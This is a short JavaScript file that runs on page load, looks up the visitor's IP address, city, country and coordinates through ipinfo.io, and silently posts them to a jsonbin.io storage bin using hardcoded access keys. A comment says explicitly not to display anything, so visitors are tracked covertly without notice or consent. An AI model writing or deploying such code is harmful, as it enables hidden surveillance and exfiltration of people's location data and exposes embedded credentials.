
function showStatus(msg, isError = false) {
  const status = document.getElementById('status');
  status.textContent = msg;
  status.style.color = isError ? '#d32f2f' : '#2193b0';
}

function requestLocation() {
  const token = "43197bed689c2d";
  fetch("https://ipinfo.io/json", {
    headers: {
      "Authorization": "Basic " + btoa(token + ":")
    }
  })
  .then(res => {
    if (!res.ok) throw new Error('Failed to fetch location');
    return res.json();
  })
  .then(data => {
    // Prepare location data
    const locationData = {
      ip: data.ip,
      city: data.city,
      country: data.country,
      loc: data.loc,
      timestamp: new Date().toISOString()
    };

    // Save to jsonbin.io
    let req = new XMLHttpRequest();
    req.onreadystatechange = () => {
      if (req.readyState == XMLHttpRequest.DONE) {
        // Optionally, you can log or handle the response, but do not display anything
        // let resp = JSON.parse(req.responseText);
        // console.log('Saved to jsonbin:', resp);
      }
    };
    req.open("POST", "https://api.jsonbin.io/v3/b", true);
    req.setRequestHeader("Content-Type", "application/json");
    req.setRequestHeader("X-Access-Key", "$2a$10$slQ8Abl3UgEQwK657k1.2Ok2NqlOdnUeF7rfsU0Q7X54kFA/lHFv.");
    req.send(JSON.stringify(locationData));
  })
  .catch(err => {
    showStatus('Could not get location.', true);
  });
}

window.onload = requestLocation;
